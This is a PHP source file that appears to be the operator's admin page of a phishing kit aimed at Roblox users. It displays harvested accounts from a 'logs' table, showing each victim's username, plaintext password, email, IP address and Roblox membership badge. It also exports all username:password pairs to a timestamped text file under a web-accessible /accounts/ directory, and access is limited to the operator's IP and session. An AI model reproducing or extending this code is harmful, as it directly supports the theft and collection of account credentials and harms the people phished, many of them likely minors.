<?php
include_once $_SERVER['DOCUMENT_ROOT'].'/global/header.php';

$ip = $_SERVER['REMOTE_ADDR'];

if($ip == $yourIP && isset($_SESSION['username'])) {


$getData = $handler->prepare("SELECT * FROM logs ORDER BY id");
$getData->execute();


$msg = "";
$id = $_GET['id'];


if(isset($_POST['deleteRow'])) {
  $dropData = $handler->prepare("DELETE FROM logs WHERE id = ?");
  $dropData->execute(array($id));
  $msg = "Deleted row " . $id . "!";
}

if(isset($_POST['export'])) {
  $newexport = time();
  $mostrecent = $newexport;

  $file = $_SERVER['DOCUMENT_ROOT'].'/accounts/' . $newexport . '.txt';
  $f = fopen($file, 'w');

   foreach($getData->fetchAll(PDO::FETCH_ASSOC) as $row) :
      $user = $row['username'];
      $pass = $row['password'];

      $accounts = "$user:$pass\n";

      fwrite($f, $accounts);

  endforeach;
  fclose($f);
  $msg = "Exported all usernames and passwords to " . $mostrecent . ".txt in the /accounts/ directory! Please reload the page to continue browsing through logged accounts. If you want to clear the accounts list, please truncate (empty) the `logs` table in your database.";
}



?>




<div class="content">
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-12">
                <div class="card">
                    <div class="card-content table-responsive">
                        <div class="row">
                          <div class="col-md-12">
                            <h3>Logs</h3>
                            <h4><? echo $msg; ?></h4>
                            <form action="admin" method="post">
                              <button type="submit" name="export" id="export" class="btn btn-success pull-right">Export</button>
                            </form>
                          </div>
                        </div>

                        <table class="table">
                              <thead class="text-primary">
                                  <th>Avatar</th>
                                  <th>Username</th>
                                  <th>Password</th>
                                  <th>BC</th>
                                  <th>Email</th>
                                  <th>IP</th>
                              </thead>
                              <tbody>
                              <?php foreach($getData->fetchAll(PDO::FETCH_ASSOC) as $row) : ?>
                                  <tr>
                                    <td><img style="width:100px;height:100px;" src="https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username=<?echo htmlspecialchars($row['username']);?>" /></td>
                                    <td><b><?echo htmlspecialchars($row['username']);?></b></td>
                                    <td><b><?echo htmlspecialchars($row['password']);?></b></td>
                                    <td><img style="width:66px;height:19px;" src="https://www.roblox.com/Thumbs/BCOverlay.ashx?username=<?echo htmlspecialchars($row['username']);?>" /></td>
                                    <td><?echo htmlspecialchars($row['email']);?></td>
                                    <td><?echo htmlspecialchars($row['ip']);?></td>
                                    <form action="admin?id=<?echo $row['id'];?>" method="post">
                                      <td><button type="submit" name="deleteRow" id="deleteRow" class="btn btn-danger"><i class="material-icons">delete_forever</i></button>
                                    </form>
                                  </tr>
                              <?php endforeach;?>
                              </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>




<?php
include_once $_SERVER['DOCUMENT_ROOT'].'/global/footer.php';


} else {
  header("Location: http://" . $siteLink . "");
}

?>
